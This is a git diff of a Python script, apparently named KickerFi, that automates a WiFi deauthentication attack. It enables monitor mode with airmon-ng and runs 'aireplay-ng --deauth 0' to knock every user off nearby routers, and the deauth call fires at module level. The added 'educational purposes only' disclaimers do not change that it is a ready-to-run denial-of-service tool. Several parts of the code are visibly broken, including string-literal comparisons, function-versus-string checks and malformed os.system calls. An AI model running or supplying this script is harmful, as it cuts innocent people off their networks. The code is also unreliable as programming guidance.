@@ -21,6 +21,22 @@ magenta = '\033[35m'
 cyan = '\033[36m'
 reset = '\033[0m'
 
+def CheckFile():
+    if not os.path.exists("Adapters.txt"):
+        with open("Adapters.txt","w")as file:
+            file.write(" ")
+CheckFile()
+
+def ReadFile():
+    with open("Adapters.txt", "r") as file:
+        Content = file.read()
+        if "wlan1" in "Adapters.txt":
+            print("JE to tu : ",Content)
+
+def SaveOutput(output):
+    with open("Adapter.txt", "w")as file:
+        file.write(output)
+
 def CheckSUDO():
     if os.geteuid() !=0:
         print(" ")
@@ -46,11 +62,13 @@ def DISCLAIMER():
     print(f"                                        {yellow}+{reset} ------------------ {yellow}+{reset}")
     print(" ")
     print(f"{red}Don't use this script without permissions{reset} owners of WiFi routers devices and for {red}illegal use{reset} {orange}!{reset}")
+    print(f"{red}Don't use this script with EVIL INTENT and for abuse !")
+    print(f"{green}THIS IS FOR EDUCATIONAL PURPOSES{reset} {orange}ONLY !{reset} (How it works ...)")
     print(" ")
-    print(f"Do You Really want Start THIS SCRIPT {orange}FOR KICKING ALL USERS{reset} from ALL WiFi Routers around ? ({green}Yes{reset} / {red}No{reset}) :")
+    print(f"Do You Really want to Start THIS SCRIPT {orange}FOR DISCONNECT ALL USERS{reset} from ALL WiFi Routers around ? ({green}Yes{reset} / {red}No{reset}) :")
     print(" ")
     print(" ")
-    dis = input("--> ")
+    dis = input("  --> ")
     if dis == "Yes" or dis =="yes":
         sleep(1)
         print("Ok, Continuining")
@@ -127,32 +145,44 @@ def exitting():
     print(f"  {green}Thank You{reset} for using Our Script :D")
 
 def MonMODE_wlan1():
-        print(f"{orange}Starting{reset} MONITOR MODE on {green}'wlan1'{reset} ...")
-        sleep(1)
-        os.system("sudo airmon-ng check")
-        sleep(1)
-        os.system("sudo airmon-ng check kill")
-        sleep(1)
-        os.system("sudo airmon-ng start wlan1")
-        sleep(2)
-        print(f"{orange}Monitor MODE{reset} {green}Sucessfully ENABLED{reset}")
-        sleep(1)
-        os.system("clear")
+    print(f"{orange}Starting{reset} MONITOR MODE on {green}'wlan1'{reset} ...")
+    sleep(1)
+    os.system("sudo airmon-ng check")
+    sleep(1)
+    os.system("sudo airmon-ng check kill")
+    sleep(1)
+    os.system("sudo airmon-ng start wlan1")
+    sleep(2)
+    print(f"{orange}Monitor MODE{reset} {green}Sucessfully ENABLED{reset}")
+    sleep(1)
+    os.system("clear")
 
 def MonMODE_wlan0():
-        print(f"{orange}Starting{reset} MONITOR MODE on {green}'wlan0'{reset} ...")
-        sleep(1)
-        os.system("sudo airmon-ng check")
-        sleep(1)
-        os.system("sudo airmon-ng check kill")
-        sleep(1)
-        os.system("sudo airmon-ng start wlan0")
-        sleep(2)
-        print(f"{orange}Monitor MODE{reset} {green}Sucessfully ENABLED{reset}")
-        sleep(1)
-        os.system("clear")
+    print(f"{orange}Starting{reset} MONITOR MODE on {green}'wlan0'{reset} ...")
+    sleep(1)
+    os.system("sudo airmon-ng check")
+    sleep(1)
+    os.system("sudo airmon-ng check kill")
+    sleep(1)
+    os.system("sudo airmon-ng start wlan0")
+    sleep(2)
+    print(f"{orange}Monitor MODE{reset} {green}Sucessfully ENABLED{reset}")
+    sleep(1)
+    os.system("clear")
 
-# NASTAVENIE INTERFACE (wlan0 alebo wlan1)
+def MonMODE_wlan1Down():
+    sleep(1)
+    os.system("sudo airmon-ng stop wlan1")
+    sleep(1)
+    os.system("sudo service NetworkManager restart")
+    sleep(3)
+
+def MonMODE_wlan0Down():
+    sleep(1)
+    os.system("sudo airmon-ng stop wlan0")
+    sleep(1)
+    os.system("sudo service NetworkManager restart")
+    sleep(3)
 
 KickerFiLOGO()
 
@@ -172,23 +202,23 @@ print(" ")
 def AirodumpNg():
     os.system("clear")
     sleep(1)
-    print(f"{yellow}Starting{reset} airodump-ng on ", Interface,"WIFi Adapter")
+    print(f"{yellow}Starting{reset} airodump-ng on", Interface,"WIFi Adapter")
     sleep(1)
-    SubProc = subprocess.Popen(["airodump-ng",Interface])
+    SubProc = subprocess.Popen(["airodump-ng ", Interface])
     sleep(28)
     SubProc.terminate()
 
 def AirEplayNg():
-    subprocess.call(["aireplay-ng","--deauth","0",Interface])
+    subprocess.call(["sudo", "aireplay-ng", "--deauth", "0" ,Interface])
 
-AirEplayNg()    
-    
+AirEplayNg()
+
 def AirCrackNg():
     os.system("clear")
     sleep(1)
     print(" ")
+    print("NENI TO ESTE ")
     print(" ")
-    print("")
     
 def Start_KickerFi():
     os.system("clear")
@@ -205,7 +235,7 @@ def Start_KickerFi():
         print(" ")
         print(" ")
         print(f"[ 1 ] {green}START AiroDump-ng on{reset}",Interface)
-        print(f"[ 2 ] {orange}STOP{reset}{orange}MONITOR MODE{reset} on" ,Interface)
+        print(f"[ 2 ] {orange}STOP{reset} {orange}MONITOR MODE{reset} on" ,Interface)
         print(f"[ 3 ] ")
         print(f"[ 4 ] {red}EXIT{reset}")
         c = input("Option : ")
@@ -217,7 +247,7 @@ def Start_KickerFi():
         elif c =="2":
             os.system("clear")    
             sleep(1)
-            os.system("sudo airmon-ng",Interface ,"stop")
+            os.system("sudo airmon-ng stop",Interface)
             sleep(3)
             os.system("sudo service NetworkManager restart")
             sleep(3)
@@ -245,7 +275,18 @@ def Start_KickerFi():
 def SetupKickerFi():
     os.system("clear")
     # TO DO
-print("Starting ... to co neni nastavene")
+print("Which WiFi Adapter you want to save for next use ?\n[ 1 ] wlan0\n[ 2 ] wlan1\n")
+SaveAndForNexUse = input("  Select --> ")
+
+output = " "
+
+if SaveOutput =="1":
+    output += print("wlan0")
+
+elif SaveOutput =="2":
+    output += print("wlan1")
+
+SaveOutput(output)
 
 os.system("clear")
 sleep(0.2)
